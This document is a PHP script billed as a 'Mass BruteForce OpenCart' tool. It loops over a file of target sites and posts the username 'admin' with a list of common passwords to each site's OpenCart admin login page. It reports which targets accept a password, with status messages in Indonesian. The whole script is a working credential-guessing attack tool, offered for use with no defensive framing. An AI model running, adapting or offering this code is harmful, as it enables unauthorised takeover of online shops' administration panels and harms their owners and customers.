<?php

echo "\n>> Mass BruteForce OpenCart\n";
echo ">> Created By MarsHall\n\n";

$list = file_get_contents("open.txt");
$open = explode("\n", $list);
foreach($open as $tar){
$passw = "admin
demo
admin123
123456
123456789
123
1234
12345
1234567
12345678
123456789
admin1234
admin123456
pass123
root
321321
123123
112233
102030
password
pass
qwerty
abc123
654321
pass1234";
$password = explode("\n", $passw);
foreach($password as $pass){
$sal = curl_init();
        curl_setopt($sal, CURLOPT_URL, $tar."/index.php?route=common/login");
        curl_setopt($sal, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($sal, CURLOPT_HEADER, 1);
        curl_setopt($sal, CURLOPT_POST, 1);
        curl_setopt($sal, CURLOPT_POSTFIELDS, "username=admin&password=$pass&submit=1");
        $cop = curl_exec($sal);
        
        
    preg_match("/HTTP\/2 302/i", $cop, $hasil);
    if (!empty($hasil)) {
        
        echo "\n[+] $tar => Login Berhasil\n";
        echo "[+] U : admin || password : $pass\n\n";

    } else {
    
        echo "[×] $tar => Login Gagal\n";
        
    } 
    }
    }
   
  
?>